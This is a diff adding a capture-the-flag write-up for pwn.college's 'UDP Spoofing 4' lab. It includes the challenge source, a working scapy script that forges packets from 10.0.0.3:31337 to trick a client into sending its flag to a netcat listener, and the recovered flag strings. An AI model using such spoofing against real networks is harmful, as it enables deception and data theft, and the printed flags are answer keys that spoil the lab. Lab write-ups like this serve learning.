@@ -2123,6 +2123,75 @@ pwn.college{gaHGS_2JwLNSOQCbFMznbkN_zzL.QX2QDM2EDL4ITM0EzW}
 
 ## UDP Spoofing 4
 
+### Source code
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import psutil
+import socket
+import time
+import os
+
+from dojjail import Host, Network
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class ServerHost(Host):
+    def entrypoint(self):
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        server_socket.bind(("0.0.0.0", 31337))
+        while True:
+            try:
+                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
+                if client_message.strip() == b"ACTION?":
+                    server_socket.sendto(b"NONE", (client_host, client_port))
+            except ConnectionError:
+                continue
+
+class ClientHost(Host):
+    def entrypoint(self):
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while True:
+            time.sleep(1)
+            try:
+                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))
+                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
+                if peer_host == "10.0.0.3" and peer_port == 31337 and message.startswith(b"FLAG"):
+                    _, flag_host, flag_port = message.strip().split(b":")
+                    client_socket.sendto(flag.encode(), (flag_host, int(flag_port)))
+            except (ConnectionError, ValueError):
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+client_host = ClientHost("ip-10-0-0-2")
+server_host = ServerHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2", server_host: "10.0.0.3"}, subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(environ=parent_process.environ())
+```
+
+Now, you must spoof both the source IP and port to make it appear as if the packet came from `10.0.0.3:31337`.
+
+Our code from the last challenge should work here as well.
+
+```
+root@ip-10-0-0-1:/# nc -u -lvp 9999 &
+[1] 751
+```
+
+```py
+In [1]: from scapy.all import *
+   ...: 
+   ...: for port in range(32768, 61000):
+   ...:     pkt = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=port) / Raw(load="FLAG:10.0.0.1:9999")
+   ...:     send(pkt, verbose=0)
+   ...: 
+nc: getnameinfo: Temporary failure in name resolution
+pwn.college{sRelbVQeI3jCMhBSrRS21P2Rv_k.QX3QDM2EDL4ITM0EzW}
+```
+
 &nbsp;
 
 ## ARP
